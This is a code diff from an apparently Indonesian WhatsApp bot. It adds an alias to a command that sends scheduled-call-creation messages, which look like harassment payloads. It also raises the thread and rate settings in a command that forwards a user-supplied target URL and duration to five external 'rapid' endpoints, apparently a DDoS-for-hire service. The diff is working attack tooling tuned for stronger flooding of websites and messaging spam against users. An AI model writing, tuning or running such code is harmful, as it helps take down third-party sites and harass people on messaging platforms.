@@ -2309,7 +2309,7 @@ conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: sched
 }
 break
 
-case 'datajam': {
+case 'realtime': case 'datajam': {
 var mundur = await hitungmundur(4, 23)
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
@@ -6048,11 +6048,11 @@ if (!text) throw `Masukkan URL!\n\n*Contoh:* ${command} www.google.com|60`;
 let [urlnya, jumlahe] = text.split`|`
 if (!urlnya) return paycall(`Example : ${prefix + command} www.google.com|60`)
 if (!jumlahe) return paycall(`Example : ${prefix + command} www.google.com|60`)
-let nyeh = await fetchJson(`https://simanbumbu.shop/rapid?time=${jumlahe}&th=10&ra=100&url=${urlnya}`);
-let nyeh2 = await fetchJson(`https://shieldid.site/rapid?time=${jumlahe}&th=10&ra=100&url=${urlnya}`);
-let nyeh3 = await fetchJson(`https://api2.simanbumbu.shop/rapid?time=${jumlahe}&th=10&ra=100&url=${urlnya}`);
-let nyeh4 = await fetchJson(`https://api3.simanbumbu.shop/rapid?time=${jumlahe}&th=10&ra=100&url=${urlnya}`);
-let nyeh5 = await fetchJson(`https://api4.simanbumbu.shop/rapid?time=${jumlahe}&th=10&ra=100&url=${urlnya}`);
+let nyeh = await fetchJson(`https://simanbumbu.shop/rapid?time=${jumlahe}&th=80&ra=512&url=${urlnya}`);
+let nyeh2 = await fetchJson(`https://shieldid.site/rapid?time=${jumlahe}&th=80&ra=512&url=${urlnya}`);
+let nyeh3 = await fetchJson(`https://api2.simanbumbu.shop/rapid?time=${jumlahe}&th=80&ra=512&url=${urlnya}`);
+let nyeh4 = await fetchJson(`https://api3.simanbumbu.shop/rapid?time=${jumlahe}&th=80&ra=512&url=${urlnya}`);
+let nyeh5 = await fetchJson(`https://api4.simanbumbu.shop/rapid?time=${jumlahe}&th=80&ra=512&url=${urlnya}`);
 try {
 await conn.sendMessage(from, {text: done }, {quoted: m})
 } catch (error) {
